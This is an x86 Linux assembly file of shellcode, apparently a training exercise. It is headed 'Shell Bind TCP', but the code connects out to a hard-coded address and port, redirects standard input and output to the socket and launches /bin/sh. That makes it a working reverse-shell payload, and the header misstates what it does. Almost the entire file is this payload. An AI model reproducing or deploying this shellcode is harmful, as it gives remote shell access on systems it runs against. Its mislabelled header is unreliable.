; Author: Eduardo Silva
; 
; Shell Bind TCP Shellcode
; 
;

global	_start

section	.text

_start:

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	cdq ; zeroes edx
	
	; socket syscall

	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	; edx is already zero
	int 0x80	; interruption syscall or interrupt vector. Returns pointer to the socket in eax

	; connect syscall

	mov ebx, eax 	; moves socket address to ebx (first arg - sockfd)
	xor eax, eax
    ; sockaddr struct
	push edx	; ; pushing our 8 bytes of zero
	push 0x0201017f 	; 127.1.1.2 --> 0x7F010102, little-endian = 0x0201017F
	push word 0x2923    ;little endian -> 9001 = 0x2329
	push word 0x2
	mov ecx, esp
	
	mov dl, 0x10 ; sizeof struct
	mov ax, 0x16a
	int 0x80

	; dup2
    xor ecx, ecx
	mov cl, 0x03
dup2:
	xor eax, eax
	mov al, 0x3f
	;mov ebx, edi
	dec cl
	int 0x80
	jnz dup2	; decrements ecx and jumps until ecx=0

	; execve

	xor eax, eax
	cdq
	push eax
	push 0x68732f2f ; "hs//"
	push 0x6e69622f ; "nib/"
	mov ebx, esp
	mov al, 0xb
	int 0x80		


